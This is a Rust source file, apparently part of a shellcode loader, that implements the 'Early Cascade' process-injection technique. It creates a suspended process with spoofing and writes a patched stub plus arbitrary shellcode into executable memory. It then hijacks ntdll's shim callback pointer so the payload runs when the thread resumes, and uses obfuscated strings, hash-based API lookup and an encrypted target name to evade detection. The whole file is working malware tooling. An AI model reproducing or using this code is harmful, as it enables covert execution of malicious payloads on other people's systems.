use crate::ntapi::*;
use crate::syscall::common::env::get_loaded_module_by_hash;

mod stub;

#[cfg(feature = "run_early_cascade")]
pub unsafe fn exec(
    shellcode_ptr: usize,
    shellcode_len: usize,
) -> crate::utils::error::RslResult<()> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via Early Cascade...");

    use obfstr::obfstr;

    use crate::utils::simple_decrypt;
    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));

    // 1. Create Process in Suspended State
    let process_info = create_process_with_spoofing(target_program.as_str(), true)?;

    // 2. Prepare Cascade Stub
    let cascade_stub = stub::get_stub();
    let mut cascade_stub = cascade_stub[..66].to_vec();

    // 3. Allocate Memory in Target Process
    let total_len = cascade_stub.len() + shellcode_len;
    let remote_mem =
        alloc_virtual_memory_at(process_info.hProcess, 0, total_len, PAGE_EXECUTE_READWRITE)?;

    // 4. Resolve ntdll sections
    let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
    let ntdll_base = get_loaded_module_by_hash(ntdll_hash).ok_or("Failed to find ntdll.dll")?;

    let mrdata_base =
        crate::syscall::common::pe::get_section_base_address(ntdll_base, obfstr!(".mrdata"))
            .ok_or("Failed to find .mrdata section")?;
    let data_base =
        crate::syscall::common::pe::get_section_base_address(ntdll_base, obfstr!(".data"))
            .ok_or("Failed to find .data section")?;

    let g_shims_enabled = data_base + 0x6cf0;
    let g_pfn_se_dll_loaded = mrdata_base + 0x270;

    // Resolve NtQueueApcThread
    let nt_queue_apc_thread_hash = crate::dbj2_hash!(b"NtQueueApcThread");
    let nt_queue_apc_thread =
        crate::syscall::common::pe::get_export_by_hash(ntdll_base, nt_queue_apc_thread_hash)
            .ok_or("Failed to find NtQueueApcThread")? as usize;

    // Patch payload_addr
    let payload_addr = remote_mem + cascade_stub.len();
    cascade_stub[16..24].copy_from_slice(&payload_addr.to_le_bytes());

    // Patch g_ShimsEnabled
    cascade_stub[25..33].copy_from_slice(&g_shims_enabled.to_le_bytes());

    // Patch NtQueueApcThread for r8
    cascade_stub[35..43].copy_from_slice(&nt_queue_apc_thread.to_le_bytes());

    // Patch NtQueueApcThread for rax
    cascade_stub[49..57].copy_from_slice(&nt_queue_apc_thread.to_le_bytes());

    // 6. Write Stub and Payload
    write_virtual_memory(process_info.hProcess, remote_mem, &cascade_stub)?;

    let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
    write_virtual_memory(process_info.hProcess, payload_addr, shellcode_slice)?;

    // 7. Enable Shims (Write 1 to g_ShimsEnabled)
    let shim_enabled_val: u8 = 1;

    write_virtual_memory(process_info.hProcess, g_shims_enabled, &[shim_enabled_val])?;

    // 8. Overwrite g_pfnSE_DllLoaded
    // First change protection to RW
    let _old_prot = protect_virtual_memory(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        std::mem::size_of::<usize>(),
        PAGE_READWRITE,
    )?;

    // Encode pointer to our stub
    let encoded_ptr = crate::utils::sys_encode_fn_pointer(remote_mem);

    write_virtual_memory(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        &encoded_ptr.to_le_bytes(),
    )?;

    // 9. Resume Thread
    resume_thread(process_info.hThread)?;

    Ok(())
}
